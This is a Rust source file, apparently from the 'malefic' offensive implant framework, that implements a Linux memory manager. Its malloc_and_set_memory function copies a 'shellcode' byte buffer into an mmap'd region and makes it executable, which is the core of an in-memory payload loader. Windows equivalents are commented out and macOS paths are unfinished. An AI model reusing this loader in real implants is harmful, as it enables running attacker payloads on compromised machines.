/*
    MemManager just support Linux and Darwin :)
    
    For Windows, please use malefic-win-kit :_)
*/

use crate::CommonError;
use std::collections::BTreeMap;

#[derive(Clone)]
pub struct MaleficMemManager {
    mems: BTreeMap<usize, MaleficChunk>,
    next_id: usize
}

impl MaleficMemManager {
    pub fn default() -> Self {
        Self {
            mems: BTreeMap::new(),
            next_id: 0
        }
    }

    pub unsafe fn alloc(&mut self, size: usize) -> Result<usize, ()> {
        let mem = MaleficChunk::new(size);
        if mem.is_err() {
            return Err(());
        }
        let mem = mem.unwrap();
        let id = self.next_id;
        self.next_id += 1;
        self.mems.insert(id, mem);
        return Ok(id);
    }

    pub unsafe fn remove(&mut self, id: usize) -> Result<(), ()> {
        if self.mems.contains_key(&id) {
            let mut mem = self.mems.remove(&id).unwrap();
            let _ = mem.delete();
            return Ok(());
        }
        return Err(());
    }

    pub unsafe fn dele(&mut self) {
        let ids: Vec<usize> = self.mems.keys().cloned().collect();
        for id in ids {
            let _ = self.remove(id);
        }
    }

    pub unsafe fn get(&self, id: usize) -> Option<&MaleficChunk> {
        self.mems.get(&id)
    }
}


#[allow(dead_code)]
#[derive(Clone, Copy)]
pub struct MaleficChunk {
    ptr: *mut core::ffi::c_void,
    size: usize,
    handle: *const core::ffi::c_void
}

pub fn malloc_and_set_memory(shellcode: Vec<u8>) -> Result<MaleficChunk, CommonError> {
    let size = shellcode.len();

    let memory = MaleficChunk::new(size);
    if memory.is_err() {
       return memory;
    }
    let memory = memory.unwrap();
    memory.set_mem(shellcode.as_ptr() as *const core::ffi::c_void);
    let _ = memory.set_protect_exec()?;
    return Ok(memory);
}


impl MaleficChunk {
    pub fn get_ptr(&self) -> *mut core::ffi::c_void {
        self.ptr
    }

    pub fn get_size(&self) -> usize {
        self.size
    }

    pub fn new_fd(size: usize, fd : i64) -> Result<Self, CommonError>{
        if fd.is_negative() || size.eq(&0) {
            return Err(CommonError::AllocationFailed);
        }
        #[cfg(target_os = "linux")]
        {
            let ptr = unsafe {
                libc::mmap(core::ptr::null_mut(),
                           size,
                           libc::PROT_READ |
                           libc::PROT_WRITE,
                           libc::MAP_PRIVATE,
                           fd as i32,
                           0)
                };
            if ptr == libc::MAP_FAILED {
                return Err(CommonError::AllocationFailed);
            }
            return Ok(Self { ptr, size, handle: core::ptr::null() })
        }
        #[cfg(target_os = "macos")]
        {
            todo!()
        }
        todo!()
    }

    #[allow(unused_variables)]
    pub fn new(size: usize) -> Result<Self,CommonError> {
        #[cfg(target_os = "linux")]
        {
            let ptr = unsafe {
                libc::mmap(core::ptr::null_mut(),
                           size,
                           libc::PROT_READ |
                           libc::PROT_WRITE,
                           libc::MAP_PRIVATE | libc::MAP_ANON,
                           -1,
                           0)
                };
                if ptr == libc::MAP_FAILED {
                    return Err(CommonError::AllocationFailed);
                }
                return Ok(Self { ptr, size, handle: core::ptr::null() })
        }
        #[cfg(target_os = "macos")]
        {
         todo!()
        }
        // #[cfg(target_os = "windows")]
        // {
        //     unsafe {
        //         let ptr =
        //             windows::Win32::System::Memory::VirtualAlloc(
        //                 None,
        //                 size,
        //                 windows::Win32::System::Memory::MEM_COMMIT |
        //                 windows::Win32::System::Memory::MEM_RESERVE,
        //                 windows::Win32::System::Memory::PAGE_READWRITE
        //             );
        //         if ptr.is_null() {
        //             return Err(CommonError::AllocationFailed);
        //         }
        //         return Ok(Self { ptr, size, handle: core::ptr::null() });
        //     }
        // }
        return Ok(Self { ptr: (core::ptr::null_mut()), size: (0) , handle: core::ptr::null()})

    }

    #[allow(unused_variables)]
    pub fn set_protect(&self, prot: u32) -> Result<(), CommonError> {
        #[cfg(target_os = "linux")]
        unsafe {
            libc::mprotect(self.ptr,
                           self.size,
                           prot as libc::c_int);
        }
        // #[cfg(target_os = "windows")]
        // unsafe {
        //     use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
        //     let mut old_prot : PAGE_PROTECTION_FLAGS = windows::Win32::System::Memory::PAGE_READWRITE;
        //     windows::Win32::System::Memory::VirtualProtect(
        //         self.ptr,
        //         self.size,
        //         PAGE_PROTECTION_FLAGS(prot),
        //         &mut old_prot
        //     )? ;
        //     Ok(())
        // }
        Ok(())
    }

    pub fn set_protect_exec(&self) -> Result<(), CommonError> {
        #[cfg(target_os = "linux")]
        unsafe {
            libc::mprotect(self.ptr,
                           self.size,
                           libc::PROT_EXEC);
        }
        // #[cfg(target_os = "windows")]
        // unsafe {
        //     use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;
        //     let mut old_prot : PAGE_PROTECTION_FLAGS = windows::Win32::System::Memory::PAGE_READWRITE;
        //     windows::Win32::System::Memory::VirtualProtect(
        //         self.ptr,
        //         self.size,
        //         windows::Win32::System::Memory::PAGE_EXECUTE,
        //         &mut old_prot)?;
        // }
        Ok(())
    }

    #[allow(unused_variables)]
    pub fn delete(&mut self) -> Result<(), CommonError> {
        #[cfg(target_os = "linux")] {
            unsafe {
                let ret = libc::munmap(self.ptr, self.size);
                if ret < 0 {
                    return Err(CommonError::FreeFailed);
                }
                return Ok(())
            }
        }
        // #[cfg(target_os = "windows")]
        // unsafe {
        //     windows::Win32::System::Memory::VirtualFree(self.ptr, self.size, windows::Win32::System::Memory::MEM_RELEASE)?;
        //     self.ptr = std::ptr::null_mut();
        // }
        Ok(())
    }

    pub fn set_mem(&self, ptr: *const core::ffi::c_void) {
        unsafe {
            std::ptr::copy(ptr, self.ptr, self.size);
        }
    }

}
